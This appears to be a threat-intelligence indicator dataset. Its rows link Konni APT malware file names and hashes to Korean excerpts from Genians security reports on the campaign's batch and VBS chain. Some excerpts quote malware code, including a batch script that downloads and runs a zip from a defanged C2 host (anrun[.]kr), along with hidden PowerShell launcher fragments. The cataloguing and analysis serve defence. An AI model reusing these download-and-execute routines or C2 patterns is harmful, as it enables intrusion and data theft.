temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:aec25f48955064ff5f1f4453a66caf3773de10a5840c6d6d680187f7ac6aceb8,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:c59a6550654a414298f64ec915aed7b8fe500854157feee56d8932643ef31625,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:67a61bd57b10a58efca535ee14a0fde0c46e8f4f2953d0358bb176a8242e3d7a,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 33 f. ‘19288086.bat’ ○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64] 암호화와 다운로드 설정 루틴을 지니고 있습니다. 파일명 19288086.bat MD5 b4461d68a8026981ab47294c2c7b5d91 SHA1 f1b4748d50a38952edc2f0953cd270ec17bb5b2a SHA256 79f61da076edf4cc9434e1c1f25ca62664d5f0bc5b9b91736 60f3089491eb8fe [표 14] 19288086.bat 파일 HASH 정보 화면 ○ 변수명 (if not ""%ypczipzqWxLByMQH%"" == ""0"") 에 따라 암호화 루틴이 작동하는데, ‘73888454.bat’ 파일에서 호출 될 때 사용이 됩니다. [그림 25] 19288086.bat 내부 코드 화면",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:1c745bb95ea1774d3ca4e56984b676ef2d6a3fb0d415262437372a5ad5022b62,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:3fe6d406e0287c3e88ec6bef4b8fdedadce0aaebbd9e7271bf3159a43fed3221,observation--sha256:91242025f93a916cbc510b6be5318707699d2d0130355b5fcbad106862e21000,file-name,20190429_13.doc,20190429_13.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,20190429_13.doc,
1.0.0,actor--konni,artifact--sha256:ee9705a7c04894c002f45189f02795939d6ead19fe148db65bb21b550712f970,observation--sha256:c0ce21b64d8b585a35e389d473befe514e0eae798273f3448d972a35fecfb00a,file-name,20190513_8.doc,20190513_8.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,20190513_8.doc,
1.0.0,actor--konni,artifact--sha256:46be393c9c8e22a1ff42d1aa44ad0851e354c6406d737c127ba619f49d20653c,observation--sha256:b0e5f264f83a92984d9a443d097db1cc537f246bd75060129495e827c26eed06,file-name,20Campaign_Report.pdf,20Campaign_Report.pdf,candidate,2017-08-01T00:00:00Z,month,known,same-record,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Reference List https://asec.ahnlab.com/ko/1251/ https://blog.alyac.co.kr/2061 https://blog.alyac.co.kr/3014 https://blog.alyac.co.kr/3390 https://blog.alyac.co.kr/3550 https://blogs.blackberry.com/en/2017/08/threat-spotlight-konni-stealthy-remote-access-trojan https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html https://download.ahnlab.com/kr/site/library/Analysis_Report_Operation_Moneyholic.pdf https://e.cyberint.com/hubfs/Cyberint_Konni%20Malware%202019%20Campaig,
1.0.0,actor--konni,artifact--sha256:c9ab44ca32054720a789294377c79247479e42efc21f0ab5447148dd2e7c1861,observation--sha256:41be1a6fc6279f7ecc8e9ccd86f83e0320802bbdd62f163d152dab940ff02d1b,file-name,230418.bat,230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:c9ab44ca32054720a789294377c79247479e42efc21f0ab5447148dd2e7c1861,observation--sha256:405f5d7db797909ee42a5ced77718d4eb8f03550a4b807620d414fdb554710c4,file-name,230418.bat,230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:06fa7989e34d12cec7d7ccdec2f8b4bcab3b066a6e87ca692b9e6b52ca6e8c81,observation--sha256:caf666375d026ff0c95ca67bd379f67d0de649d09369834332f73f16c079da6b,file-name,230419.hwp,230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:06fa7989e34d12cec7d7ccdec2f8b4bcab3b066a6e87ca692b9e6b52ca6e8c81,observation--sha256:1aa6f1db5f01b9c6d12101bfba777f7a8aeda47c4c885468caab3625659e9423,file-name,230419.hwp,230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:2e119fb609701b76439bb0ab34b0be08b3a03611db82d0ad6245bcc84d0ad939,observation--sha256:eac8d0b15bfd3a0d78db44e5dc868e37931e67c7a77997fdf40615bfb6c0d372,file-name,230704.vbs,230704.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:d8e1967a2f2cd0f971889d041acd2e82a423d71b821e457bc709a90210d5ba16,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:126c741f73dfb61d523161ea4674f695f79194cf4790ea2f1aef4d77a296cc59,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:cfac7fa999e561788c5bfd112aca8b499e136e9ec8a139d8fe711a420e6316ce,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:19110900872547ca8fc355f9dc77317fa9a4f8cd070014d93f0040384dd2d212,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 24 [그림 15] 73888454.bat 파일 내부 코드 화면 ○ 만약 ‘30966118.bat’ 파일이 없을 경우에는 ""upok.txt"" 파일이 존재하지 않을 경우에만 ‘32981202.bat’ 파일을 실행하는데, ‘upok.txt’ 파일은 컴퓨터 정보가 유출(Upload OK)될 때 만들어 집니다. ○ 그 다음 루틴은 ‘pakistan.txt’ 파일 존재 여부에 따라 (goto 1), (goto EXIT)로 분기됩니다. 처음 악성 파일이 작동할 때는 해당 파일이 존재하지 않기 때문에 (goto 1) 루틴으로 점프하게 됩니다. 만약 파일이 존재할 경우에는 (goto EXIT) 루틴은 ‘pakistan.txt’ 파일을 삭제하고 종료되는데, 일종의 ‘킬 스위치(Kill Switch)’와 같은 비상 종료 기능을 수행합니다. 이는 다수의 Konni 캠페인에서 지속적으로 사용중인 방식입니다.",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:e54fcc09b171b996e5fb03c6e4f8c683faf82ec36425ecbdb2de65362728d195,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:37ad00a5db5ede87a0177e6c87daeef6367408954eb5e041cb71d6cac0821469,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:5f03f28b163282909f585611c65fbf285020e574e8951ea1c9b0f230563c8bb4,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:6cc93cfe24e287175619a3895f45135982f9c729d34dce0e0460c0947cff4c26,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:d5692cb45b178dc8bcb12d1615ca1c7aab5039f77021dd12c2ca98a419c5c513,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:817733e0157da760961c0834935c699504c59307ee5241e31a282ee1cb6a4812,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:24d8176053ba013855a4f0a2e5297ae3042cbdcd45f072b18b487e15807a4337,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:74eaa4ca8e4dee0ddcd6a6677ef8b82dcfaf9698d0907c3b3ea63332c067975f,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:7888a455ac9c8a56dd44f75c0e66f5ecb6a8ae458138287c3712ebdaeed42bc7,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:16dbd9741997705b95cdd9c21cbb46adca28b49214cea49a732e54983d90dc38,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 